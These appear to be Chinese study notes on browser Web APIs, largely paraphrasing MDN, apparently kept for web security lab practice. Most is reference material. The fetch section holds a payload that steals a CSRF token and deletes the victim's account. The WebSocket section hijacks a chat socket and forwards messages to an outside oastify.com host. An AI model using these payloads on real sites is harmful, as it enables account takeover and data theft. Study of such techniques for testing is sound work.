# Web API

https://developer.mozilla.org/zh-CN/docs/Web/API

## MessageEvent

https://developer.mozilla.org/zh-CN/docs/Web/API/MessageEvent

### MessageEvent: source property

此功能在 [Web Workers] 中可用。

[`MessageEvent`] 接口的 **`source`** 只读属性是一个 `MessageEventSource`，表示消息的发出者。

值
- 一个 `MessageEventSource`（可以是 [`WindowProxy`]、[`MessagePort`] 或 [`ServiceWorker`] 对象），表示消息的发出者。

## Web Storage API

https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API

Web Storage API 提供了浏览器可以存储键/值对的机制，其方式比使用 cookie 更直观。

### 概念与用法

Web Storage 中的两种机制如下：

- `sessionStorage` 按浏览器标签页和[源]进行分区。主文档以及所有嵌入的[浏览上下文]（iframe）按其源分组，每个源都可以访问自己独立的存储区域。关闭浏览器标签页会销毁与该标签页关联的所有 `sessionStorage` 数据。

- `localStorage` 仅按[源]进行分区。具有相同源的所有文档都可以访问同一个 `localStorage` 区域，并且即使浏览器关闭后重新打开，它也会持续存在。

这些机制可通过 [`Window.sessionStorage`] 和 [`Window.localStorage`] 属性使用。访问其中之一将返回一个 [`Storage`] 对象实例，通过该对象可以设置、获取和移除数据项。每个源的 `sessionStorage` 和 `localStorage` 使用不同的存储对象——它们独立运作并分别受控。

要了解使用这些 API 可用的存储量，以及超出存储限制时会发生什么，请参阅[存储配额和驱逐标准](https://developer.mozilla.org/en-US/docs/Web/API/Storage_API/Storage_quotas_and_eviction_criteria)。

Web Storage 中的 `sessionStorage` 和 `localStorage` 本质上都是同步的。这意味着当从这些存储机制中设置、获取或移除数据时，操作是同步执行的，会阻塞其他 JavaScript 代码的执行，直到操作完成。这种同步行为可能会影响 Web 应用程序的性能，尤其是在存储或获取大量数据时。

异步替代方案（如 [IndexedDB](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API)）可能更适合性能敏感或处理较大数据集的场景。这些替代方案允许非阻塞操作，从而实现更流畅的用户体验和更好的 Web 应用程序性能。

> **注意：**
> 如果用户[禁用了第三方 Cookie](https://support.mozilla.org/en-US/kb/third-party-cookies-firefox-tracking-protection)，则拒绝第三方 IFrame 访问 Web Storage。

### 确定第三方的存储访问权限

每个源都有自己的存储——这对 Web Storage 和[共享存储](https://developer.mozilla.org/en-US/docs/Web/API/Shared_Storage_API)都成立。但是，第三方（即嵌入式）代码对共享存储的访问取决于其[浏览上下文]。来自另一个源的第三方代码运行所在的上下文决定了该第三方代码的存储访问权限。

![一个方框图，显示一个名为 publisher.com 的顶层浏览上下文，其中嵌入了第三方内容](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/embedded-content.png)

第三方代码可以通过使用 [`<script>`] 元素注入，或通过将 [`<iframe>`] 的源设置为包含第三方代码的站点，来添加到另一个站点。用于集成第三方代码的方法决定了该代码的浏览上下文。

- 如果第三方代码通过 `<script>` 元素添加到另一个站点，你的代码将在嵌入者的浏览上下文中执行。因此，当你调用 [`Storage.setItem()`] 或 [`SharedStorage.set()`] 时，键/值对将写入嵌入者的存储。从浏览器的角度来看，使用 `<script>` 标签时，第一方代码和第三方代码之间没有区别。

- 当第三方代码通过 `<iframe>` 添加到另一个站点时，`<iframe>` 内的代码将以 `<iframe>` 浏览上下文的源执行。如果 `<iframe>` 内的代码调用 [`Storage.setItem()`]，数据将写入 `<iframe>` 源的本地或会话存储。如果 `<iframe>` 代码调用 [`SharedStorage.set()`] ，数据将写入 `<iframe>` 源的共享存储。

### Web Storage 接口

**[`Storage`](https://developer.mozilla.org/en-US/docs/Web/API/Storage)**

- 允许你为特定域和存储类型（会话或本地）设置、获取和移除数据。

**[`Window`](https://developer.mozilla.org/en-US/docs/Web/API/Window)**

- Web Storage API 通过两个新属性扩展了 [`Window`] 对象——[`Window.sessionStorage`] 和 [`Window.localStorage`]——它们分别提供对当前域的会话和本地 [`Storage`] 对象的访问，以及一个 [`storage`] 事件处理器，在存储区域发生变化（例如存储了新项）时触发。

**[`StorageEvent`](https://developer.mozilla.org/en-US/docs/Web/API/StorageEvent)**

- 当存储区域发生变化时，会在文档的 `Window` 对象上触发 `storage` 事件。

### 示例

为了说明一些典型的 Web Storage 用法，我们创建了一个示例，命名为 [Web Storage Demo](https://github.com/mdn/dom-examples/tree/main/web-storage)。[落地页](https://mdn.github.io/dom-examples/web-storage/)提供了可用于自定义颜色、字体和装饰图像的控件。当你选择不同选项时，页面会立即更新；此外，你的选择会存储在 `localStorage` 中，因此当你离开页面后再次加载时，你的选择会被记住。

此外，我们还提供了一个[事件输出页面](https://mdn.github.io/dom-examples/web-storage/event.html)——如果你在另一个标签页中加载此页面，然后在落地页中更改你的选择，你将看到更新的存储信息在 [`StorageEvent`](https://developer.mozilla.org/en-US/docs/Web/API/StorageEvent) 触发时输出。

### 隐私浏览 / 无痕模式

隐私窗口、无痕模式以及类似命名的隐私浏览选项不会存储历史记录和 Cookie 等数据。在隐私模式下，`localStorage` 被视为 `sessionStorage`。存储 API 仍然可用且功能完整，但存储在隐私窗口中的所有数据会在浏览器或浏览器标签页关闭时删除。

## 🎯 Storage

作为 Web Storage API 的接口，`Storage` 提供了访问特定域名下的会话存储或本地存储的功能，例如，可以添加、修改或删除存储的数据项。

- `Window.sessionStorage` 
  操作一个域名的会话存储，

- `Window.localStorage`
  操作一个域名的本地存储

### Storage.length

返回存储在一个给定的 `Storage` 对象中的数据项的数量。

### Storage.getItem()

当传递一个键名时，将返回该键的值；而如果在给定的 `Storage` 对象中不存在该键，则返回 `null`

```js
getItem(keyName)
```

### Storage.key()

当传递一个数字 n 时，返回给定存储对象中第 n 个键的名称。键的顺序取决于用户代理，所以你不应该依赖它。

```js
key(index)
```

下面的函数遍历本地存储键，并获得每个键的设定值：
```js
for (let i = 0; i < localStorage.length; i++) {
  let name = localStorage.key(i);
  let value = localStorage.getItem(name);
  console.log(name + ': ' + value);
}
```
## HTMLInputElement

### HTMLInputElement.select()

`HTMLInputElement.select()` 方法**选中**一个 `<textarea>` 元素或者一个带有 `text` 字段的 `<input>` 元素里的所有内容。

```js
element.select()
```

## Navigator

https://developer.mozilla.org/zh-CN/docs/Web/API/Navigator

`Navigator` 接口代表了用户代理的状态和身份，它允许脚本对其进行查询并注册自身以便执行某些活动。

可以通过 `window.navigator` 只读属性获取 `Navigator` 对象。

标准属性
- `Navigator.clipboard` 只读 安全上下文
  返回一个用于读写访问系统剪贴板内容的 Clipboard 对象。
- `Navigator.userAgent` 只读
  返回当前浏览器的用户代理。

## Clipboard API

剪贴板 Clipboard API 提供了响应剪贴板命令（剪切、复制和粘贴）与异步读写系统剪贴板的能力。从权限 Permissions API 获取权限之后，才能访问剪贴板内容；如果用户没有授予权限，则不允许读取或更改剪贴板内容。

该 API 被设计用来取代使用 `document.execCommand()` 的剪贴板访问方式。

## Clipboard

Clipboard API 的 `Clipboard` 接口提供系统剪贴板读写访问的权限。这让 Web 应用程序可以实现剪切、复制和粘贴功能。

系统剪贴板暴露于全局属性 `Navigator.clipboard` 之中。

所有 Clipboard API 方法都是异步的；它们返回一个 `Promise` 对象，在剪贴板访问完成后被兑现。如果剪贴板访问被拒绝，`promise` 也会被拒绝。

### Clipboard：writeText()

`Clipboard` 接口的 `writeText()` 方法用于将指定文本写入系统剪贴板，并返回一个在剪贴板内容更新后兑现的 `Promise`。

```js
writeText(newClipText)
```

安全考虑
- 只能在安全上下文中读取剪贴板。

##  Event

### Event：target 属性

`Event` 接口的 `target` 只读属性是对事件被分派到的对象的引用。当事件处理器在事件的冒泡或捕获阶段被调用时，它与 `Event.currentTarget` 不同。

值
- 关联的 `EventTarget`。

### Event：preventDefault()

`Event` 接口的 `preventDefault()` 方法，阻止用户代理的默认动作执行（例如页面滚动、链接跳转或粘贴文本）

此事件仍会继续传播，除非碰到事件监听器调用 `stopPropagation()` 或 `stopImmediatePropagation()` 才停止传播。

对于不可取消的事件（例如通过 `EventTarget.dispatchEvent()` 分派的、没有指定 `cancelable: true` 的事件），调用 `preventDefault()` 没有任何效果。

```js
preventDefault()
```

## EventTarget

### EventTarget.addEventListener()

将指定的监听器注册到 `EventTarget` 上，当该对象触发指定的事件时，指定的回调函数就会被执行。

```js
addEventListener(type, listener); // 最常用
addEventListener(type, listener, options);
addEventListener(type, listener, useCapture);
```

参数
- `type`
  表示监听事件类型的大小写敏感的字符串。
- `listener`
  当所监听的事件类型触发时，会接收到一个事件通知（实现了 `Event` 接口的对象）对象。`listener` 必须是一个实现了 `EventListener` 接口的对象，或者是一个函数。有关回调本身的详细信息，请参阅事件监听回调

## Comment

https://developer.mozilla.org/zh-CN/docs/Web/API/Comment

## Range

https://developer.mozilla.org/zh-CN/docs/Web/API/Range

`Range` 接口表示一个包含节点与文本节点的一部分的文档片段。

方法
- `Range.setStartBefore(referenceNode)`
  将 `Range` 的起始位置设置在参数的基准 `Node` 之前

- `Range.setStartAfter(referenceNode)`
  将 `Range` 的起始位置设置在参数的基准 `Node` 之后

- `Range.setEndAfter(referenceNode)`
  将 `Range` 的终止位置设置在参数的基准 `Node` 之前

- `Range.setEndAfter(referenceNode)`
  将 `Range` 的终止位置设置在参数的基准 `Node` 之后

### Range.toString() 

返回 `Range` 文本的字符串化器。

注意 `Range` 的内容会隐式调用 `toString()`

```js
toString()
```

### Range.cloneContents()

返回一个 `DocumentFragment`，它是 `Range` 中所有的 `Node` 对象的副本。


```js
documentFragment = range.cloneContents();
```

## DocumentFragment

https://developer.mozilla.org/zh-CN/docs/Web/API/DocumentFragment

文档片段接口，表示一个没有父对象的最小文档对象。

注意，无 `innerHTML` 属性，读取结构需添加到元素再使用元素的 `innerHTML`

## Document

创建元素并添加到 DOM

```js
const form = document.createElement('form');
form.method = 'post';
document.documentElement.append(form);
```

### Document：createRange() 

返回一个新的 `Range` 对象。

```js
createRange();
```

### document.createComment

创建并返回一个注释节点。

```js
var commentNode = document.createComment(data)
```

参数
- `commentNode` 是一个注释节点。
- `data` 是一个字符串，包含了注释的内容。


### document.querySelector()

文档对象模型 `Document` 引用的 `querySelector()` 方法返回文档中与指定选择器或选择器组匹配的第一个 `Element` 对象。如果找不到匹配项，则返回 `null`。

```js
element = document.querySelector(selectors);
```

参数
- `selectors`
  包含一个或多个要匹配的选择器的字符串。该字符串必须是有效的 CSS 选择器字符串；如果不是，则抛出 SYNTAX_ERR 异常。

### document.execCommand

https://developer.mozilla.org/zh-CN/docs/Web/API/Document/execCommand

未标准化

已被弃用

不属于任何规范

`execCommand` 方法实现了多种不同的命令。其中一些命令提供对剪贴板的访问，另一些则用于编辑[表单输入]、[`contenteditable`] 元素或整个文档（当切换到[设计模式]时）。

若要访问剪贴板，推荐使用较新的 [Clipboard API]，而不是 `execCommand()`。

大多数命令会影响文档的[选区]。例如，一些命令（加粗、斜体等）会格式化当前选中的文本，而另一些命令会删除选区、插入新元素（替换选区）或影响整行（缩进）。只有当前活动的可编辑元素才能被修改，但某些命令（例如 `copy`）无需可编辑元素也能工作。

```js
execCommand(commandName, showDefaultUI, valueArgument)
```

参数
- `commandName`
  一个 `String`，命令的名称。可用命令列表请参阅 `命令` 。

- `aShowDefaultUI`
  一个 Boolean，是否展示用户界面，一般为 false。Mozilla 没有实现。

- `aValueArgument`
  一些命令（例如 `insertImage`）需要额外的参数（`insertImage` 需要提供插入 `image` 的 url），默认为 `null`。

命令
- `copy`
  拷贝当前**选中**内容到剪贴板。
- `insertHTML`
  在插入点插入一个 HTML 字符串（删除选中的部分）。需要 HTML 字符串作为参数。
- `insertImage`
  在插入点插入一张图片（删除选中的部分）。需要一个 URL 字符串作为参数。这个 URL 图片地址至少包含一个字符。空白字符也可以

> firefox 解析 `commandName` 并不使用 unicode，而是相近字符映射 `\u0130nsertHTML` 将被识别为 `insertHTML`

### createElement()

Document 接口的 `createElement()` 方法用于创建一个具有指定 localName 的 HTMLElement。

如果 localName 无法被识别，该方法将创建一个 HTMLUnknownElement。

```js
createElement(localName)
createElement(localName, options)
```

参数
- `localName`
  一个指定要创建的元素类型的字符串。

返回值
- 新的 `Element`。

## Element

- `element.outerHTML` 属性
  获取描述元素（包括其后代）的序列化 HTML 片段。它也可以设置为用从给定字符串解析的节点替换元素。

- `element.innerHTML` 属性
  设置或获取 HTML 语法表示的元素的后代。

### Element：input 事件

https://developer.mozilla.org/zh-CN/docs/Web/API/Element/input_event

当一个 `<input>`、`<select>` 或 `<textarea> `元素的 value 被修改时，会触发 input 事件。

> 每当元素的 `value` 改变，`input` 事件都会被触发。这与 `change` 事件不同。`change` 事件仅当 `value` 被提交时触发，如按回车键，从一个 `options` 列表中选择一个值等。

> 值改变可包含任意数量的字符，不限单个

### HTML 元素：change 事件

https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLElement/change_event

当用户更改 `<input`>、`<select>` 和 `<textarea>` 元素的值时，`change` 事件在这些元素上触发。和 `input` 事件不同的是，并不是每次元素的 `value` 改变时都会触发 `change` 事件。

事件类型
- 通用 `Event`

### Element.before()

在当前节点之前插入一系列的 Node 或者字符串对象，

```js
before(param1)
before(param1, param2)
before(param1, param2, /* …, */ paramN)
```

### Element.after()

在当前节点之后插入一系列的 Node 或者字符串对象，

```js
after(node1)
after(node1, node2)
after(node1, node2, /* … ,*/ nodeN)
```

### Element.remove()

把对象从它所属的 DOM 树中删除。

```js
remove()
```

### Element.querySelector()

返回与指定的选择器组匹配的元素的后代的第一个元素。

```js
element = baseElement.querySelector(selectors);
```
- `element` 和 `baseElement` 是 `element` 对象。
- `selectors` 是一个 CSS 选择器字符串。

### element.insertAdjacentHTML

https://developer.mozilla.org/zh-CN/docs/Web/API/Element/insertAdjacentHTML

`insertAdjacentHTML()` 方法将指定的文本解析为 `Element` 元素，并将结果节点插入到 DOM 树中的指定位置。

```js
insertAdjacentHTML(position, text)
```

参数
- `position`
  插入内容相对于元素的位置
  - `beforebegin`：元素自身的前面。
  - `afterbegin`：插入元素内部的第一个子节点之前。
  - `beforeend`：插入元素内部的最后一个子节点之后。
  - `afterend`：元素自身的后面。

- `text`
  字符串将被解析为 HTML 或 XML 元素，并插入到 DOM 树

### NonDocumentTypeChildNode.nextElementSibling

`nextElementSibling` 返回当前元素在其父元素的子元素节点中的后一个元素节点（即，在同一父元素下，返回当前元素的后一个兄弟节点），如果该元素已经是最后一个元素节点，则返回 `null`, 该属性是只读的。

```js
var nextNode = elementNodeReference.nextElementSibling;
```

用来在循环中遍历兄弟节点

## Node

### Node.textContent

https://developer.mozilla.org/zh-CN/docs/Web/API/Node/textContent

`textContent` 
- 读取时，获取所有元素的内容
- 写入时，文本不会被解析为 HTML

### Node.appendChild

方法将一个节点附加到指定父节点的子节点列表的末尾处。如果将被插入的节点已经存在于当前文档的文档树中，那么 `appendChild()` 只会将它从原先的位置移动到新的位置

```js
appendChild(aChild)
```

参数
- `aChild`
  要追加给父节点（通常为一个元素）的节点。

> 注：若文档尚未加载完成，将产生异常。使用搭配事件监听器 `DOMContentLoaded` 

## History

- `back()` 方法
  使浏览器在会话历史中后退一页。

## console

https://developer.mozilla.org/zh-CN/docs/Web/API/console

- `console.trace()` 静态方法
  将堆栈追踪信息输出到控制台


## fetch

<https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch>

> 有时 `fetch` 这类请求失败，`location` 与 `new Image().src` 成功

- `response.ok` 判断状态
```js
if (!response.ok) {
  if (response.status === 404) {
    console.log('请求的资源不存在');
  } else if (response.status === 500) {
    console.log('服务器内部错误');
  }
}

```

- `redirect: 'manual'`
  不追踪重定向

示例
```js
// 携带凭证，获取页面 csrf 令牌
fetch('/my-account', {credentials: 'include'})
    .then(response => response.text())
    .then(text => {
        console.log('text', text);
        // 使用 HTML DOM 解析响应文本
        const parser = new DOMParser();
        const doc = parser.parseFromString(text, 'text/html');
        // 使用浏览器开发者攻击的 JS 元素选择器快速定位元素，获取 csrf 令牌
        const csrf_token = doc.querySelector('#delete-account-form > input[type=hidden]').value;
        console.log('csrf_token', csrf_token);
        // 携带凭证，并发送 csrf 令牌
        fetch('/my-account/delete', {
            method: 'POST',
            mode: 'no-cors',
            credentials: 'include',
            body: new URLSearchParams({
                'csrf': csrf_token
            })
        });
    }); 
```

## Response —— 对一次请求的响应数据

https://developer.mozilla.org/zh-CN/docs/Web/API/Response

属性
- `Response.status` 只读
  包含 Response 的状态码（例如 200 表示成功）。
- `Response.statusText` 只读
  包含了与该 Response 状态码一致的状态信息（例如，OK 对应 200）。
- `Response.headers` 只读
  包含此 Response 所关联的 Headers 对象。


### Response.text()

提供了一个可供读取的“返回流”（`Response stream`），并将它读取完。它返回一个包含 `String` 对象（也就是文本）的 `Promise` 对象，返回结果的编码永远是 UTF-8。

## Headers

Fetch API 的 Headers 接口对 HTTP 请求和响应头执行各种操作。这些操作包括检索，设置，添加和删除。

一个 Headers 对象具有关联的标头列表，它最初为空，由零个或多个键值对组成。

## WebSocket

https://developer.mozilla.org/en-US/docs/Web/API/WebSocket

- `WebSocket()` 构造函数
  返回一个 WebSocket 对象
  ```js
  new WebSocket(url)
  new WebSocket(url, protocols)
  ```
  - url
    必须使用以下方案之一：ws、wss、http 或 https，且不得包含 URL 片段

- `WebSocket.send()` 方法
  将需要通过 WebSocket 链接传输至服务器的数据排入队列

```js
let newWebSocket = new WebSocket("wss://id.web-security-academy.net/chat");

newWebSocket.onopen = function(evt) {
    newWebSocket.send("READY");
}

newWebSocket.onmessage = function(evt) {
    var message = evt.data;

    fetch("https://id.oastify.com/ws", {
        method: "POST",
        mode: 'no-cors', 
        body: message
    });
};
```



## URLSearchParams

https://developer.mozilla.org/zh-CN/docs/Web/API/URLSearchParams

- `URLSearchParams()` 构造函数
  创建并返回一个新的 URLSearchParams 对象。

- `URLSearchParams.toString()`
  返回查询参数组成的字符串，可直接使用在 URL 上。

## DOM

### DOM 事件

https://developer.mozilla.org/zh-CN/docs/Web/API/Document_Object_Model/Events


## DOMParser

DOMParser 接口提供了从字符串解析 XML 或 HTML 源代码为 DOM Document 对象的能力。

构造函数
- `DOMParser()`
  创建一个新的 DOMParser 对象。

实例方法
- `parseFromString(input, mimeType)`
  解析包含 HTML 或 XML 的输入，并返回一个 Document 对象，该对象的 `contentType` 属性与 `mimeType` 参数匹配。

## HTMLIFrameElement

https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLIFrameElement

`HTMLIFrameElement` 接口提供了除 `HTMLElement` 之外的一些特殊属性和方法（当然也包括了继承自 `HTMLElement` 的部分）。这些方法用于操作内联 `frame` 元素的布局和展示。

属性
- `contentDocument`
  如果 `iframe` 及其父文档处于同源，则返回一个 `Document`（即嵌套浏览上下文中的活动文档），否则返回 `null`。

### HTMLIFrameElement：contentWindow 属性

https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLIFrameElement/contentWindow

`contentWindow` 属性返回 `HTMLIFrameElement` 的 `Window` 对象。

访问由 `contentWindow` 返回的 `Window` 受到同源策略规定的规则约束，这意味着，如果与 `iframe` 父级同源，那么父级页面可以访问 `iframe` 的文档以及内部 DOM，如果它们跨源，则父页面对窗口属性的访问权限极其有限。

## Window

- `open(url, target, windowFeatures)` 方法
  用指定的名称 `name` 将指定的资源加载到新的或已存在的浏览上下文（标签、窗口或 iframe）中。
  - `target`
    一个不含空格的字符串，用于指定加载资源的浏览上下文的名称 `name`。

- `Window.parent` 属性
  对当前窗口或子框架的父窗口的引用。
  - 如果没有父窗口，那么它的 `parent` 属性会引用它自身。
  - 当一个窗口加载在 `<iframe>`、`<object>` 或` <frame>` 中时，它的父窗口是嵌套该窗口的元素所属的窗口。

- `Window.location`
  获取/设置 `window` 对象的位置，或当前的 URL。

- `Window.navigator` 只读属性
  返回一个 `Navigator` 对象的引用，可以用于请求运行当前代码的应用程序的相关信息。

### window.postMessage —— 跨源通信

https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage

```js
otherWindow.postMessage(message, targetOrigin, [transfer]);
```

- `otherWindow`
  其他窗口的一个引用，比如 `iframe` 的 `contentWindow` 属性、执行`window.open`返回的窗口对象、或者是命名过或数值索引的`window.frames`。

- `message`
    将要发送到其他 `window` 的数据。

- `targetOrigin`
  通过窗口的 `origin` 属性来指定哪些窗口能接收到消息事件，其值可以是字符串 `*`（表示无限制）或者一个 URI。

### Window.frames

https://developer.mozilla.org/zh-CN/docs/Web/API/Window/frames

返回当前窗口，一个类数组对象，列出了当前窗口的所有直接子窗口。

> 即使不同源，父页面仍可通过索引获取子/孙框架的引用。仍无法读取，但可设置链接

```js
frameList = window.frames;
```

```js
// 获取子框架
const frame_l1 = window.frames[0];
// 获取孙框架
const frame_l2 = frame_l1.frames[0];
```

## HTMLElement

https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLElement

### 🎯 HTMLElement：innerText 属性

`HTMLElement` 接口的 `innerText` 属性表示一个节点及其后代所渲染文本的内容。

> [!note] `innerText` 很容易与 `Node.textContent` 混淆，但这两个属性间实际上有很重要的区别。大体来说，`innerText` 知道文本的渲染外观，而 `textContent` 不知道。

> 即，`innerText` 可被用来渲染的 css 修改。例如 `text-transform` 修改文本大小写

输出
- 一个字符串，代表元素的渲染文本内容。
  如果元素本身没有被渲染（例如，从文档中分离出来或从视图中隐藏起来），返回值与 `Node.textContent` 属性相同。